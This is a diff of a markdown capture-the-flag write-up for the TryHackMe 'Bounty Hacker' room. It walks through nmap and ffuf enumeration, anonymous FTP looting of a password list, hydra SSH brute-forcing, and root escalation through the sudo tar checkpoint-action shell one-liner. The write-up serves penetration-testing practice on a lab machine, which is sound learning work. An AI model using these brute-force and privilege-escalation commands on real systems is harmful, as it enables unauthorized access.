@@ -1,32 +1,36 @@
-# Bounty Hacker 
----
+# Bounty-Hacker
 
-# Info
-| Name        |    Bounty Hacker     					| 
-| ------      | -----------------                       |
-| Room link   | https://tryhackme.com/room/cowboyhacker |  
-| Difficulty  | Easy                                    |
-| Created by  | [Sevuhl](https://tryhackme.com/p/Sevuhl)|
-|solving date | July 10th     2022                      |
+## Bounty Hacker
 
----
+***
 
-- Table Of Contents
-	- [Enumeration](#user-content-enum)
-	    - [nmap scan](#user-content-nmap) 
-	    - [apache server](#user-content-apache)
-	    - [Discovering FTP](#user-content-ftp)
-	    - [Brute-forcing](#user-content-bruteforce)
-    - [Gaining Access](#gaining-access--)
-    	- [user.txt](#user-content-user.txt)
-    - [Privilege Escalation](#privilege-escalation-)
-        - [list user's privileges](#user-content-user-priv)
-        - [root.txt](#user-content-root.txt)
+## Info
 
+| Name         | Bounty Hacker                            |
+| ------------ | ---------------------------------------- |
+| Room link    | https://tryhackme.com/room/cowboyhacker  |
+| Difficulty   | Easy                                     |
+| Created by   | [Sevuhl](https://tryhackme.com/p/Sevuhl) |
+| solving date | July 10th 2022                           |
 
-## Enumeration <a name="enum"></a>
+***
 
-### nmap scan <a name="nmap"></a>
+* Table Of Contents
+  * [Enumeration](./#user-content-enum)
+    * [nmap scan](./#user-content-nmap)
+    * [apache server](./#user-content-apache)
+    * [Discovering FTP](./#user-content-ftp)
+    * [Brute-forcing](./#user-content-bruteforce)
+  * [Gaining Access](./#gaining-access--)
+    * [user.txt](./#user-content-user.txt)
+  * [Privilege Escalation](./#privilege-escalation-)
+    * [list user's privileges](./#user-content-user-priv)
+    * [root.txt](./#user-content-root.txt)
+
+### Enumeration <a href="#enum" id="enum"></a>
+
+#### nmap scan <a href="#nmap" id="nmap"></a>
+
 ```bash
 nmap -Pn -sC -sV $target 
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-10 10:43 EET
@@ -63,13 +67,14 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 48.97 seconds
 
-
 ```
 
-### Discovering the web server  <a name="apache"></a>
+#### Discovering the web server <a href="#apache" id="apache"></a>
+
 ![Web page](images/web-page)
 
-- Fuzzing the website
+* Fuzzing the website
+
 ```bash
 ffuf -u http://$target/FUZZ -w /usr/share/wordlists/dirb/common.txt -c
 
@@ -101,11 +106,10 @@ images                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration:
 index.html              [Status: 200, Size: 969, Words: 135, Lines: 31, Duration: 74ms]
 server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 77ms]
 :: Progress: [4614/4614] :: Job [1/1] :: 531 req/sec :: Duration: [0:00:08] :: Errors: 0 ::
-
 ```
 
+#### Discovering FTP <a href="#ftp" id="ftp"></a>
 
-### Discovering FTP <a name="ftp"></a>
 ```bash
  ftp $target
 Connected to 10.10.164.195.
@@ -141,7 +145,8 @@ ftp> bye
 221 Goodbye.
 ```
 
-- locks.txt
+* locks.txt
+
 ```
 rEddrAGON
 ReDdr4g0nSynd!cat3
@@ -171,7 +176,8 @@ r3ddr@g0N
 ReDSynd1ca7e
 ```
 
-- tasks.txt
+* tasks.txt
+
 ```
 1.) Protect Vicious.
 2.) Plan for Red Eye pickup on the moon.
@@ -179,18 +185,20 @@ ReDSynd1ca7e
 -lin
 ```
 
-###  Who wrote the task list?  
+#### Who wrote the task list?
+
 ```
 lin
 ```
 
+#### What service can you bruteforce with the text file found?
 
-### What service can you bruteforce with the text file found?
 ```
 ssh
 ```
 
-### Brute-forcing ssh using locks.txt wordlist <a name="bruteforce"></a>
+#### Brute-forcing ssh using locks.txt wordlist <a href="#bruteforce" id="bruteforce"></a>
+
 ```bash
 hydra -l lin -P locks.txt ssh://$target
 Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -204,12 +212,14 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-10 10:53:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-07-10 10:53:38
 ```
 
-### What is the users password? 
+#### What is the users password?
+
 ```
 ******************
 ```
 
-## Gaining Access  <a name="access"></a>
+### Gaining Access <a href="#access" id="access"></a>
+
 ```bash
 ssh lin@$target
 lin@10.10.164.195's password: 
@@ -223,10 +233,10 @@ Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)
 0 updates are security updates.
 
 Last login: Sun Jul 10 03:28:26 2022 from 10.8.90.96
-
 ```
 
-### user.txt flag <a name="user.txt"></a>
+#### user.txt flag <a href="#user.txt" id="user.txt"></a>
+
 ```bash
 lin@bountyhacker:~/Desktop$ ls
 user.txt
@@ -235,10 +245,10 @@ THM{***************}
 lin@bountyhacker:~/Desktop$ 
 ```
 
+### Privilege Escalation <a href="#privilege-escalation" id="privilege-escalation"></a>
 
-## Privilege Escalation <a name="Privilege-Escalation"></a>
+#### list user's privileges <a href="#user-priv" id="user-priv"></a>
 
-### list user's privileges <a name="user-priv"></a>
 ```bash
 lin@bountyhacker:~$ sudo -l
 [sudo] password for lin: 
@@ -252,11 +262,12 @@ lin@bountyhacker:~$
 
 [GTFOBins](https://gtfobins.github.io/gtfobins/tar/#sudo)
 
-
 ```bash
     sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 ```
-### Priv Esc <a name="root.txt"></a>
+
+#### Priv Esc <a href="#root.txt" id="root.txt"></a>
+
 ```bash
 lin@bountyhacker:~$  sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 tar: Removing leading `/' from member names
@@ -269,8 +280,8 @@ THM{*************}
 # 
 ```
 
-## I hope you enjoyed the write-up
- 
-- [Linkedin](https://www.linkedin.com/in/juba0x00/)
-- [Twitter](https://twitter.com/juba0x00/)
-- [TryHackMe](https://tryhackme.com/p/Juba0x430x55)
+### I hope you enjoyed the write-up
+
+* [Linkedin](https://www.linkedin.com/in/juba0x00/)
+* [Twitter](https://twitter.com/juba0x00/)
+* [TryHackMe](https://tryhackme.com/p/Juba0x430x55)
